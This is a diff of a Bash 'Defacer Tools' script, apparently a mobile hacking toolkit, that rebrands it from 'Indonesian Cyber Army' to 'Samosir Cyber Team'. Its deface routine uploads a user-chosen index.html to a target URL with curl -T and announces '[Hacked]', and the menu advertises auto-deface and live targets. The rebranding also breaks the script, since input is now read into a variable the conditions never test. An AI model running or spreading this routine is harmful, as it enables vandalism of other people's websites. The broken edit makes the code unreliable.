@@ -119,11 +119,11 @@ toilet -f future "    Defacer Tools" | lolcat
 echo
 echo $red"##########################$green" WELCOME "$red###########################"
 echo $yellow
-figlet -f future "Indonesian Cyber Army"
+figlet -f future "Samosir Cyber Team"
 echo
 echo $red"##########################$green" WELCOME "$red###########################"
 echo
-echo $indigo"	~"$cyan"{"$white"A"$cyan"}"$green"."$yellow"Tebas Index"$cyan
+echo $indigo"	~"$cyan"{"$white"A"$cyan"}"$green"."$yellow"Nicoleus Sitorus"$cyan
 echo $indigo"        ~"$cyan"{"$white"B"$cyan"}"$green"."$yellow"Web Scan"$cyan
 echo $indigo"	~"$cyan"{"$white"C"$cyan"}"$green"."$yellow"Auto Deface"$cyan
 echo
@@ -133,8 +133,8 @@ echo $indigo"  +"$cyan"{"$white"T"$cyan"}"$purple"."$green"TUTORIAL & LIVE TARGE
 echo $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
 echo $indigo"=============================================================="
 echo
-echo $white "╭─"$yellow"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─$ "  apaan
+echo $white "╭─"$yellow"Nicoleus"$cyan" ~/SamosirCyber"$white
+read -p " ╰─$ "  Nicoleus
 echo
 if [ $apaan = "A" ] || [ $apaan = "a" ]
 then
@@ -146,7 +146,7 @@ echo
 echo
 echo
 echo
-toilet -f future "Deface Tebas Index" | lolcat
+toilet -f future "Deface Samosir Index" | lolcat
 echo
 echo $red "Simpan SC Di Memory Internal Di Luar Folder "
 echo
@@ -171,8 +171,8 @@ echo $red "Eksekusi Taarget!!!"
 echo $green "╭─"$blue"Chemod@zrd404"$cyan" ~/IndoCyber"$white
 read -p " ╰─$ "  target
 echo
-echo $red "Masukan Script!!! "
-echo $green "╭─"$blue"Chemod@zrd404"$cyan" ~/Nama SC Harus(index.html)"$white
+echo $red "Masukan Script Nya Lae!!! "
+echo $green "╭─"$blue"Nicoleus"$cyan" ~/Nama SC Harus(index.html)"$white
 read -p " ╰─$ "  script
 curl -T /storage/emulated/0/$script $target
 echo $red "["$yellow"Hacked"$red"]"$cyan"～～～＞"$green" $target"
@@ -356,15 +356,16 @@ echo
 echo
 toilet -f future "   Informasi Tools" | lolcat
 echo $red"##########################$green" WELCOME "$red###########################"
-echo $green"Author  : Chemod_zrd404			"
-echo $purple"Gthub   : https://github.com/21D4N404"
-echo $white"Blog    : http://generasicyberindo.blogspot.com"
+echo $green"Author  : Nicoleus Sitorus			"
+echo $purple"Gthub   : https://github.com/nicoleus"
+echo $white"Facebook    : Nicoleus Sitorus"
+echo $yellow"Youtube  : ady sitorus ady"
 echo
 echo $yellow"                          THANKS TO :"
 echo
-echo $cyan"[+] MR.NAGON_TA7 & KOKO "
-echo $cyan"[+] MR.W3B_XIT "
-echo $cyan"[+] MR.L3RBI & All Member [I.C.A] "
+echo $cyan"[+] Nicoleus Sitorus "
+echo $cyan"[+] Ijen M Sinaga "
+echo $cyan"[+] SAMOSIR Cyber Team & All Member [I.C.A] "
 echo $red"##########################$green" WELCOME "$red###########################"
 echo $indigo"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
 echo
@@ -382,7 +383,7 @@ fi
 
 if [ $apaan = "Q" ] || [ $apaan = "q" ]
 then
-echo " Terimakasih Sudah Menggunakan Tools Kami :) "
+echo " Terimakasih Sudah Menggunakan Tools Kami lAE :) "
 exit
 clear
 fi
